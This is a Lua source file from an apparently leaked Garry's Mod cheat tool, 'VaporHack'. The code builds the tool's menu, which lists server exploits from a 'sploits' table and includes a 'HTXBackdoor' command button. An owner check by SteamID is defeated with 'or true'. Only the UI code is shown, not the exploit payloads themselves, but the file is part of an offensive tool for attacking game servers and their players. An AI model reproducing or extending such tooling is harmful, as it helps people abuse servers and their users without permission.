function VAPOR.MakeTextInputButton( parent, x, y, btext, default, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local tentry = vgui.Create( "DTextEntry", hostframe )
tentry:SetPos( 10 + tttt:GetWide(), 2 )
tentry:SetSize( 130, 20 )
tentry:SetText( VAPOR.GetStored( addr, default ) )
tentry.OnChange = function( self )
VAPOR.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + tentry:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end


function VAPOR.MakeNumberInputButton( parent, x, y, btext, default, min, max, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local wangmeoff = vgui.Create( "DNumberWang", hostframe )
wangmeoff:SetPos( 10 + tttt:GetWide(), 2 )
wangmeoff:SetSize( 75, 20 )
wangmeoff:SetDecimals( 2 )
wangmeoff:SetMinMax( min , max )
wangmeoff:SetValue( VAPOR.GetStored( addr, default ) )
wangmeoff:SetAllowNonAsciiCharacters(false)
wangmeoff.OnValueChanged = function( self, val )
VAPOR.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + wangmeoff:GetWide(), 24 )    
return hostframe:GetWide(), hostframe:GetTall()
end




-- INSERTION DU DERMA MENU
local FillFrameRates = RatesScaleLevel
concommand.Add( "open_vaporhack", function()
if FillFrameRates == "STEAM_0:0:189348722" -- Hoper
or FillFrameRates == "STEAM_0:0:99250842" -- Silent
or FillFrameRates == "STEAM_0:1:196391683" -- Polyvie
or true
then VAPOR.Menu = vgui.Create("DFrame")
VAPOR.Menu:SetSize(700,450)
VAPOR.Menu:SetTitle("")
VAPOR.Menu:Center()
VAPOR.Menu:SetDraggable( false )
VAPOR.Menu:MakePopup()
VAPOR.Menu.gay = table.Count( VAPOR.sploits )
VAPOR.Menu:ShowCloseButton( false ) 
VAPOR.Menu.Paint = function( s, w, h )
surface.SetDrawColor( Color(60, 60, 60, 245) )   ---<
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(100, 100, 100, 220) )  --
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.SetDrawColor( Color(20, 20, 20, 230) )
surface.DrawRect( 10, 10, w - 20, h - 20 )
surface.SetDrawColor( Color(100, 100, 100, 200) )
--surface.DrawRect( 0, 520, w - 0, h - 0 )
--surface.SetDrawColor( Color(255, 66, 66, 0) )
--surface.DrawRect( 0, 520, w - 0, h - 0 )
surface.SetDrawColor( Color(255, 66, 66, 0) )
surface.DrawLine( 10, 25, 40, 30 )
surface.DrawLine( 40, 30, 70, 25 )
surface.DrawLine( 10, 25, 25, 40 )
surface.DrawLine( 55, 40, 70, 25 )
surface.DrawLine( 25, 40, 25, 60 )
surface.DrawLine( 55, 40, 55, 60 )
surface.DrawLine( 25, 60, 40, 70 )
surface.DrawLine( 55, 60, 40, 70 )
draw.DrawText( "GOT LEAKED ON NOXPLOIT.PRO", "vaporfonthard", 260, 58, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
draw.DrawText( "VaporHack™ | by Hoper | LEAKED", "vaporfonthard", 220, 425, Color(255, 255, 255, 50) )
draw.DrawText( "亗", "vaporfontlogo", 16, 13, Color(255, 255, 255, 20) )

draw.SimpleTextOutlined( "VaporHack", "vaporfontlight", ScrW()/3.95 + math.sin(RealTime()) * ScrW() / 60, ScrH()/20, Color( 255, 255, 255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(100, 100, 100, 0) )
end

local CloseMenu = vgui.Create("DButton", VAPOR.Menu )
    CloseMenu:SetText("X")
    CloseMenu:SetSize(200, 200)
    CloseMenu:SetPos(VAPOR.Menu:GetWide()-125,-75)
    CloseMenu:SetTextColor(Color(255, 66, 66,255))
    CloseMenu:SetFont("vaporfont20")
    CloseMenu.Paint = function( self,w,h ) end
    CloseMenu.DoClick = function()
        VAPOR.Menu:Remove()

    end 

local Plist = vgui.Create( "DPanelList", VAPOR.Menu )
Plist:SetSize( VAPOR.Menu:GetWide() - 20, VAPOR.Menu:GetTall() - 35 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 10, 90 )
Plist:SetName( "" )
--VAPOR.MakeFunctionButton( VAPOR.Menu, 10, 130, "Load Config", VAPOR.LoadConfig, "Charger une Config" )
--VAPOR.MakeFunctionButton( VAPOR.Menu, 10, 160, "Save Config", VAPOR.SaveConfig, "Sauvegarder la Config" )
local function CreateSploitPanel( name, t )
if !VAPOR.Menu then return end
local cmdp = vgui.Create( "DPanel" )
cmdp:SetSize( Plist:GetWide(), 50 )
cmdp.Cmd = name
cmdp.Desc = t.desc
cmdp.Paint = function( s, w, h )
surface.SetDrawColor( Color(60, 60, 60, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( severitycols[t.severity] )
surface.DrawOutlinedRect( 0, 0, w, h )
--surface.DrawLine( 0, 24, w, 24 )
draw.DrawText( cmdp.Cmd, "DermaDefault", 11, 2, Color(255,255,255) )
--draw.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(205,205,255, 100) ) 
end

--timer.Create("timerversionchecker",7,1,function()
--hook.Remove("HUDPaint", "HudVersionChecker")
--end)
hook.Add("HUDPaint", "WelcomeToVaporHack", function() draw.SimpleTextOutlined( "VaporHack LEAKED ! OH NO.", "ravenfonthello", ScrW()/2 + math.sin(RealTime()) * ScrW() / 85, ScrH()/15, Color( 255, 94, 233,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,160) )

end)


-- POSE DES FONCTIONS BOUTONS
local x = 10
for _, tab in ipairs( t.functions ) do
if tab.typ == "func" then
x = (x + 5) + VAPOR.MakeFunctionButton( cmdp, x, 21, tab.name, tab.func )
elseif tab.typ == "players" then
x = (x + 5) + VAPOR.MakePlayerSelectionButton( cmdp, x, 21, tab.addr )
elseif tab.typ == "htxcommandeliste" then
x = (x + 5) + VAPOR.HTXBackdoor( cmdp, x, 21, tab.name )
elseif tab.typ == "string" then
x = (x + 5) + VAPOR.MakeTextInputButton( cmdp, x, 21, tab.name, tab.default, tab.addr )
if !VAPOR.IsStored( tab.addr ) then VAPOR.Store( tab.addr, tab.default ) end
elseif tab.typ == "float" then
x = (x + 5) + VAPOR.MakeNumberInputButton( cmdp, x, 21, tab.name, tab.default, tab.min, tab.max, tab.addr )
if !VAPOR.IsStored( tab.addr ) then VAPOR.Store( tab.addr, tab.default ) end
end
end
Plist:AddItem( cmdp )
end
for k, v in pairs( VAPOR.sploits ) do
if v.scan() then CreateSploitPanel( k, v ) end
end
else
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():ConCommand("dontgetit")
return end
end)
end

-- END